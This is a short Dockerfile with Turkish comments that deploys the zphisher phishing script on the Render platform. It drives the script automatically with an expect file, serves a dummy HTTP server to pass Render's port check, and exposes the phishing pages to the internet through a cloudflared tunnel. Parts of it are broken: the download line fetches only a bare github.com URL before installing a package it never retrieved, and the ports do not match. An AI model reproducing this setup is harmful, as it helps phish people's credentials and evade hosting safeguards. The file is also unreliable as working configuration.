FROM debian:stable-slim

# Gerekli araçları, python3'ü ve cloudflared için wget/ca-certificates paketlerini kuruyoruz
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    dos2unix \
    expect \
    python3 \
    wget \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Cloudflare tünel istemcisini (cloudflared) resmi sunuculardan indirip kuruyoruz
RUN wget https://github.com \
    && dpkg -i cloudflared-linux-amd64.deb \
    && rm cloudflared-linux-amd64.deb

COPY . /app
WORKDIR /app

RUN dos2unix zphisher.sh otomasyon.expect
RUN chmod +x zphisher.sh otomasyon.expect

EXPOSE ${PORT}

# Render'ın port kontrolünü geçmek için HTTP sunucusunu, 
# otomatik tuşlamaları yapan expect aracını ve cloudflared tünelini aynı anda başlatıyoruz
CMD python3 -m http.server ${PORT} & expect otomasyon.expect & sleep 30 && cloudflared tunnel --url http://127.0.0.1:8080
